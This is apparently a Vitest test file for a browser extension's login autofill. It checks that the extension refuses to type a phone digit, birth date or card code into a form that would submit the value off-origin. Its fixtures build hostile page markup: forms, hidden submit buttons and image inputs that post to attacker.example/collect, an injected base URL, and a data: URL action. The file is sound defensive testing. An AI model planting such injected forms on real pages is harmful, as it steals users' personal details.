import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { installLoginContent } from "./content";

type Listener = (
  message: unknown,
  sender: { id: string },
  respond: (value: unknown) => void,
) => boolean | undefined;
const { sent, listeners, authorize } = vi.hoisted(() => ({
  sent: [] as Record<string, unknown>[],
  listeners: [] as Listener[],
  authorize: vi.fn<(message: Record<string, unknown>) => Promise<unknown>>(),
}));

vi.mock("wxt/browser", () => ({
  browser: {
    runtime: {
      id: "synthetic-extension",
      onMessage: {
        addListener: (listener: Listener) => listeners.push(listener),
        removeListener: () => undefined,
      },
    },
  },
}));
// The background refuses each announcement, so no login runs by itself, and authorizes
// every operation it is asked about.
vi.mock("../messaging/protocol", () => ({
  sendMessage: async (_channel: string, message: Record<string, unknown>) => {
    sent.push(message);
    if (message["type"] === "login.detail.authorize") return authorize(message);
    return message["type"] === "login.operation.authorize"
      ? true
      : { ok: false, reason: "stale-document" };
  },
}));

const start = location.pathname;
let uninstall: (() => void) | undefined;
beforeEach(() => {
  sent.length = 0;
  listeners.length = 0;
  authorize
    .mockReset()
    .mockImplementation(async (message) => (message["destinations"] as string[]).length === 0);
  vi.useFakeTimers();
});
afterEach(() => {
  uninstall?.();
  uninstall = undefined;
  vi.useRealTimers();
  document.body.innerHTML = "";
  history.replaceState(null, "", start);
});

/** A synthetic page that asks for a birth year and month or the last digits of a phone. */
const choicePage = `<main><form id="extra">
  <label><input type="radio" id="by-birth" name="authType" value="2"> Birth year and month</label>
  <input id="birth" name="birth" maxlength="6">
  <label><input type="radio" id="by-phone" name="authType" value="3"> Last 4 digits of phone</label>
  <input id="phone" name="phone" inputmode="numeric" maxlength="4">
  <input id="code" name="code" type="password">
  <input id="submit" type="submit" value="Log in">
</form></main>`;
const input = (id: string) => document.querySelector<HTMLInputElement>(`#${id}`)!;
const target = (value: string) => ({ by: "id" as const, value });

/** Shows the page on `/confirm` and installs the content script; returns its token. */
async function open(markup = choicePage): Promise<string> {
  history.replaceState(null, "", "/confirm");
  document.body.innerHTML = markup;
  uninstall = installLoginContent();
  await vi.advanceTimersByTimeAsync(200);
  const token = sent[0]?.["token"];
  if (typeof token !== "string") throw new Error("The page did not announce itself");
  return token;
}
/** Sends `message` as the background does and waits for the page's answer. */
async function command(message: Record<string, unknown>): Promise<unknown> {
  const reply: { answered: boolean; value?: unknown } = { answered: false };
  for (const listener of listeners)
    listener(message, { id: "synthetic-extension" }, (value) => {
      reply.value = value;
      reply.answered = true;
    });
  for (let spent = 0; !reply.answered && spent < 5_000; spent += 50)
    // eslint-disable-next-line no-await-in-loop
    await vi.advanceTimersByTimeAsync(50);
  return reply.value;
}

describe("the popup's fill of a personal detail (ADR 0061)", () => {
  // The fill names its one input as a field of `fields` (ADR 0061, split values).
  const fill = (token: string, { path = "/confirm", ...field }: Record<string, unknown> = {}) =>
    command({
      version: 1,
      type: "login.detail.fill",
      fillId: "90000000-0000-4000-8000-000000000001",
      expiresAt: Date.now() + 60_000,
      origin: location.origin,
      submit: target("submit"),
      token,
      path,
      fields: [{ target: target("phone"), value: "1234", ...field }],
    });

  it("checks the input's radio, types the value and presses nothing", async () => {
    const token = await open();
    let submitted = 0;
    input("submit").form!.addEventListener("submit", (event) => {
      submitted += 1;
      event.preventDefault();
    });
    let clicks = 0;
    input("submit").addEventListener("click", () => (clicks += 1));
    expect(await fill(token)).toEqual({ ok: true });
    expect(input("by-phone").checked).toBe(true);
    expect(input("by-birth").checked).toBe(false);
    expect(input("phone").value).toBe("1234");
    expect(input("birth").value).toBe("");
    expect(submitted).toBe(0);
    expect(clicks).toBe(0);
    // Nothing about the fill goes back to the background.
    expect(JSON.stringify(sent)).not.toContain("1234");
  });

  it("refuses a dangling cross-site form before selecting a radio or exposing a value", async () => {
    const token = await open(
      `<form id="injected" action="https://attacker.example/collect">${choicePage}</form>`,
    );
    const events: string[] = [];
    const phone = input("phone");
    const radio = input("by-phone");
    expect(phone.form?.id).toBe("injected");
    expect(phone.form?.action).toBe("https://attacker.example/collect");
    for (const event of ["beforeinput", "input", "change"])
      phone.addEventListener(event, () => events.push(event));
    radio.addEventListener("click", () => events.push("radio"));
    expect(await fill(token)).toEqual({ ok: false });
    expect(phone.value).toBe("");
    expect(radio.checked).toBe(false);
    expect(events).toEqual([]);
  });

  it("refuses a relative form action redirected by an injected base URL", async () => {
    const token = await open();
    const base = document.createElement("base");
    base.href = "https://attacker.example/";
    document.head.append(base);
    try {
      input("phone").form!.setAttribute("action", "collect");
      expect(await fill(token)).toEqual({ ok: false });
      expect(input("phone").value).toBe("");
      expect(input("by-phone").checked).toBe(false);
    } finally {
      base.remove();
    }
  });

  it("refuses an unsupported form destination before dispatching any fill event", async () => {
    const token = await open();
    const changed = vi.fn();
    input("phone").form!.action = "data:text/html,collect";
    input("phone").addEventListener("input", changed);
    expect(await fill(token)).toEqual({ ok: false });
    expect(input("phone").value).toBe("");
    expect(input("by-phone").checked).toBe(false);
    expect(changed).not.toHaveBeenCalled();
  });

  it("keeps a same-origin form fill working", async () => {
    const token = await open();
    input("phone").form!.action = `${location.origin}/session`;
    expect(await fill(token)).toEqual({ ok: true });
    expect(input("phone").value).toBe("1234");
    expect(input("by-phone").checked).toBe(true);
  });

  it("rechecks the form destination after the radio's click changes it", async () => {
    const token = await open();
    const changed = vi.fn();
    input("phone").addEventListener("input", changed);
    input("by-phone").addEventListener("click", () => {
      input("phone").form!.action = "https://attacker.example/collect";
    });
    expect(await fill(token)).toEqual({ ok: false });
    expect(input("phone").value).toBe("");
    expect(changed).not.toHaveBeenCalled();
  });

  it("checks a shown submitter's override before exposing the value", async () => {
    const token = await open();
    input("submit").setAttribute("formaction", "https://attacker.example/collect");
    expect(await fill(token)).toEqual({ ok: false });
    expect(input("phone").value).toBe("");
    expect(input("by-phone").checked).toBe(false);
    expect(authorize).toHaveBeenCalledWith(
      expect.objectContaining({ destinations: ["https://attacker.example/collect"] }),
    );
  });

  it("checks a hidden submitter of the form elsewhere in the page, which Enter would use", async () => {
    // Injected before the form, it is the form's default button: a pressed Enter submits
    // through it and its `formaction`, though it is not shown. Controls named after the
    // form's properties do not hide it.
    const token = await open(`<button form="extra" type="submit" style="display:none"
      formaction="https://attacker.example/collect">Next</button>${choicePage}`);
    input("phone").insertAdjacentHTML(
      "afterend",
      `<input type="hidden" name="elements"><input type="hidden" name="getRootNode">`,
    );
    expect(await fill(token)).toEqual({ ok: false });
    expect(input("phone").value).toBe("");
    expect(input("by-phone").checked).toBe(false);
    expect(authorize).toHaveBeenCalledWith(
      expect.objectContaining({ destinations: ["https://attacker.example/collect"] }),
    );
  });

  it("fills with a hidden submitter of the form whose override stays on the page's origin", async () => {
    const token = await open(`<button form="extra" type="submit" style="display:none"
      formaction="/session">Next</button>${choicePage}`);
    expect(await fill(token)).toEqual({ ok: true });
    expect(input("phone").value).toBe("1234");
    expect(authorize).toHaveBeenCalledWith(expect.objectContaining({ destinations: [] }));
  });

  // An image input submits its form and can be its default button, though the form's
  // `elements` leave it out.
  const image = (formaction: string, form = ` form="extra"`) =>
    `<input type="image" id="image"${form} formaction="${formaction}" alt="Next" style="display:none">`;
  const foreign = "https://attacker.example/collect";
  it.each([
    ["before the form", `${image(foreign)}${choicePage}`],
    ["first inside the form", choicePage.replace(`<form id="extra">`, `$&${image(foreign, "")}`)],
  ])("checks a hidden image input %s, which Enter would use", async (_where, page) => {
    const token = await open(page);
    expect(input("image").form?.id).toBe("extra");
    expect(await fill(token)).toEqual({ ok: false });
    expect(input("phone").value).toBe("");
    expect(input("by-phone").checked).toBe(false);
    expect(authorize).toHaveBeenCalledWith(
      expect.objectContaining({ destinations: ["https://attacker.example/collect"] }),
    );
  });

  it("fills with a hidden image input of the form whose override stays on the page's origin", async () => {
    const token = await open(`${image("/session")}${choicePage}`);
    expect(await fill(token)).toEqual({ ok: true });
    expect(input("phone").value).toBe("1234");
    expect(authorize).toHaveBeenCalledWith(expect.objectContaining({ destinations: [] }));
  });

  it("fills nothing when an image input of the form is added during the authorization wait", async () => {
    const token = await open();
    authorize.mockImplementationOnce(async () => {
      document.body.insertAdjacentHTML("afterbegin", image(foreign));
      return true;
    });
    expect(await fill(token)).toEqual({ ok: false });
    expect(input("phone").value).toBe("");
    expect(input("by-phone").checked).toBe(false);
  });

  it("fills nothing when a submitter of the form is added during the authorization wait", async () => {
    const token = await open();
    authorize.mockImplementationOnce(async () => {
      document.body.insertAdjacentHTML(
        "afterbegin",
        `<button form="extra" type="submit" formaction="https://attacker.example/collect"
          style="display:none">Next</button>`,
      );
      return true;
    });
    expect(await fill(token)).toEqual({ ok: false });
    expect(input("phone").value).toBe("");
    expect(input("by-phone").checked).toBe(false);
  });

  it("checks every enclosing shadow form before filling an inner safe form", async () => {
    const token = await open();
    document.body.innerHTML = `<form action="https://attacker.example/collect"><div id="host"></div>
      <input id="submit" type="submit" value="Next"></form>`;
    const shadow = document.querySelector("#host")!.attachShadow({ mode: "open" });
    shadow.innerHTML = `<form action="/safe"><input id="phone" maxlength="4"></form>`;
    expect(await fill(token)).toEqual({ ok: false });
    expect(shadow.querySelector<HTMLInputElement>("#phone")!.value).toBe("");
  });

  it("fills when the background authorizes an off-origin destination", async () => {
    const token = await open();
    const destination = "https://auth.login.example/session";
    input("phone").form!.action = destination;
    authorize.mockResolvedValue(true);
    expect(await fill(token)).toEqual({ ok: true });
    expect(input("phone").value).toBe("1234");
    expect(authorize).toHaveBeenCalledWith(
      expect.objectContaining({
        type: "login.detail.authorize",
        token,
        fillId: "90000000-0000-4000-8000-000000000001",
        destinations: [destination],
      }),
    );
  });

  it.each([false, { ok: true }, undefined])(
    "fills nothing when destination authorization is refused or malformed (%j)",
    async (answer) => {
      const token = await open();
      authorize.mockResolvedValue(answer);
      expect(await fill(token)).toEqual({ ok: false });
      expect(input("phone").value).toBe("");
      expect(input("by-phone").checked).toBe(false);
    },
  );

  it("fills nothing when destination authorization is unavailable", async () => {
    const token = await open();
    authorize.mockRejectedValue(new Error("background unavailable"));
    expect(await fill(token)).toEqual({ ok: false });
    expect(input("phone").value).toBe("");
    expect(input("by-phone").checked).toBe(false);
  });

  it("fills nothing when the destination changes during the authorization wait", async () => {
    const token = await open();
    authorize.mockImplementationOnce(async () => {
      input("phone").form!.action = "https://attacker.example/collect";
      return true;
    });
    expect(await fill(token)).toEqual({ ok: false });
    expect(input("phone").value).toBe("");
    expect(input("by-phone").checked).toBe(false);
  });

  it("fills nothing when the submitter changes during the authorization wait", async () => {
    const token = await open();
    authorize.mockImplementationOnce(async () => {
      input("submit").replaceWith(input("submit").cloneNode(true));
      return true;
    });
    expect(await fill(token)).toEqual({ ok: false });
    expect(input("phone").value).toBe("");
    expect(input("by-phone").checked).toBe(false);
  });

  it("fills a card code only into a password input or a text input of 3 or 4", async () => {
    const token = await open();
    const code = { value: "012", secret: "card-code" };
    expect(await fill(token, { target: target("birth"), ...code })).toEqual({ ok: false });
    expect(input("birth").value).toBe("");
    // The radio is checked only for a fill that goes ahead.
    expect(input("by-birth").checked).toBe(false);
    expect(await fill(token, { target: target("code"), ...code })).toEqual({ ok: true });
    expect(input("code").value).toBe("012");
    expect(await fill(token, code)).toEqual({ ok: true });
    expect(input("phone").value).toBe("012");
  });

  it("fills another detail only into a text, tel or number input", async () => {
    const token = await open();
    expect(await fill(token, { target: target("code"), secret: "detail" })).toEqual({ ok: false });
    expect(input("code").value).toBe("");
    expect(await fill(token, { secret: "detail" })).toEqual({ ok: true });
    expect(input("phone").value).toBe("1234");
  });

  it("fills nothing when the radio's click turns the input into one the value may not go in", async () => {
    const token = await open();
    input("by-phone").addEventListener("click", () => {
      input("phone").type = "password";
    });
    expect(await fill(token, { secret: "detail" })).toEqual({ ok: false });
    expect(input("phone").value).toBe("");
  });

  it("fills nothing on another path, or with a value the input cannot hold", async () => {
    const token = await open();
    expect(await fill(token, { path: "/signin" })).toEqual({ ok: false });
    expect(await fill(token, { value: "12345" })).toEqual({ ok: false });
    expect(input("phone").value).toBe("");
    expect(input("by-phone").checked).toBe(false);
  });

  it("fills nothing into an input the target names more than once or not at all", async () => {
    const token = await open();
    expect(await fill(token, { target: { by: "name", value: "missing" } })).toEqual({ ok: false });
    input("phone").insertAdjacentHTML("afterend", `<input id="phone-copy" name="phone">`);
    expect(await fill(token, { target: { by: "name", value: "phone" } })).toEqual({ ok: false });
    expect(input("phone").value).toBe("");
  });

  it("fills nothing into a disabled input, or after a radio that cannot be checked", async () => {
    const token = await open();
    input("phone").disabled = true;
    expect(await fill(token)).toEqual({ ok: false });
    input("phone").disabled = false;
    input("by-phone").disabled = true;
    expect(await fill(token)).toEqual({ ok: false });
    expect(input("phone").value).toBe("");
  });

  it("fills nothing when the radio's click replaces the input", async () => {
    const token = await open();
    input("by-phone").addEventListener("click", () => {
      input("phone").replaceWith(
        Object.assign(document.createElement("input"), { id: "phone", maxLength: 4 }),
      );
    });
    expect(await fill(token)).toEqual({ ok: false });
    expect(input("phone").value).toBe("");
  });

  it("answers no other document's token", async () => {
    await open();
    let answered = false;
    for (const listener of listeners)
      expect(
        listener(
          {
            version: 1,
            type: "login.detail.fill",
            fillId: "90000000-0000-4000-8000-000000000001",
            expiresAt: Date.now() + 60_000,
            origin: location.origin,
            submit: target("submit"),
            token: "another-token",
            path: "/confirm",
            fields: [{ target: target("phone"), value: "1234" }],
          },
          { id: "synthetic-extension" },
          () => (answered = true),
        ),
      ).toBe(false);
    await vi.advanceTimersByTimeAsync(200);
    expect(answered).toBe(false);
    expect(input("phone").value).toBe("");
  });

  it("fills nothing after the background cancelled the document's login", async () => {
    const token = await open();
    await command({ version: 1, type: "login.cancel", token });
    expect(await fill(token)).toEqual({ ok: false });
    expect(input("phone").value).toBe("");
  });
});

describe("a detail handler's fill in a login (ADR 0061)", () => {
  let operations = 0;
  const execute = (token: string, choose: boolean) =>
    command({
      version: 1,
      type: "login.execute",
      token,
      operation: {
        version: 1,
        attemptId: "synthetic-attempt",
        operationId: `synthetic-operation-${(operations += 1)}`,
        policyRevision: 1,
        expiresAt: Date.now() + 60_000,
        document: { origin: location.origin, tabId: 1, frameId: 0, documentId: "synthetic" },
        stepIndex: 2,
        step: {
          kind: "fill",
          path: "/confirm",
          fields: [{ slot: "detail", target: target("phone") }],
          effect: "prepare",
        },
      },
      values: [{ slot: "detail", value: "1234", secret: "detail" }],
      ...(choose ? { choose: true } : {}),
    });

  it("checks the input's radio first with `choose`", async () => {
    const token = await open();
    const changes: string[] = [];
    input("by-phone").addEventListener("change", () => changes.push("radio"));
    input("phone").addEventListener("input", () => changes.push("input"));
    expect(await execute(token, true)).toMatchObject({ ok: true, mutation: "possible" });
    expect(input("by-phone").checked).toBe(true);
    expect(input("phone").value).toBe("1234");
    // The radio is chosen before the value goes in.
    expect(changes[0]).toBe("radio");
    expect(changes.slice(1)).toEqual(changes.slice(1).map(() => "input"));
  });

  it("leaves the radio as it is without `choose`", async () => {
    const token = await open();
    expect(await execute(token, false)).toMatchObject({ ok: true });
    expect(input("by-phone").checked).toBe(false);
    expect(input("phone").value).toBe("1234");
  });

  it("stops before typing when the radio cannot be checked", async () => {
    const token = await open();
    input("by-phone").disabled = true;
    expect(await execute(token, true)).toMatchObject({
      ok: false,
      reason: "cancelled",
      detail: "field-changed",
    });
    expect(input("phone").value).toBe("");
  });

  it("stops before typing when the radio's click replaces the input", async () => {
    const token = await open();
    input("by-phone").addEventListener("click", () => {
      input("phone").replaceWith(
        Object.assign(document.createElement("input"), { id: "phone", maxLength: 4 }),
      );
    });
    expect(await execute(token, true)).toMatchObject({
      ok: false,
      reason: "cancelled",
      detail: "field-changed",
    });
    expect(input("phone").value).toBe("");
  });

  it("stops before typing when the radio's click makes the input one a detail may not go in", async () => {
    const token = await open();
    input("by-phone").addEventListener("click", () => {
      input("phone").type = "password";
    });
    expect(await execute(token, true)).toMatchObject({
      ok: false,
      reason: "cancelled",
      detail: "field-changed",
    });
    expect(input("phone").value).toBe("");
  });

  it("stops before typing when the radio's click disables the input", async () => {
    const token = await open();
    input("by-phone").addEventListener("click", () => {
      input("phone").disabled = true;
    });
    expect(await execute(token, true)).toMatchObject({
      ok: false,
      reason: "cancelled",
      detail: "field-changed",
    });
    expect(input("phone").value).toBe("");
  });
});
